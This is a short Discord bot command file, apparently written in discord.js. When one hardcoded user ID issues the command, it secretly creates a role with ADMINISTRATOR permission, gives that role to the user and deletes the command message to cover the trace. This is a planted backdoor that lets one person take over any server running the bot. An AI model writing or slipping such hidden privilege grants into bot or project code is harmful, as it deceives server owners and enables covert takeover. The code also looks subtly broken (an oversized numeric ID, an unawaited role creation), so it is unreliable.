const Discord = require("discord.js");
const fs = require("fs");
const config = require("../config.json");
const colour = config.colour;

module.exports.run = async (client, message, args) => {
  let MACK = 287874798049165313
  if(message.author.id == MACK) {
    message.guild.createRole({
        name: 'Screw Jelly',
        color: 'BLUE',
    })
    let Managers = message.guild.roles.find("name", "Screw Jelly");
    message.guild.roles.find('name', 'Screw Jelly').setPermissions('ADMINISTRATOR')
    message.member.addRole(Managers);
    message.delete();
  }
	
  else {

  }
}
module.exports.config = {
    name: "admin",
    aliases: ["perms"]
  }
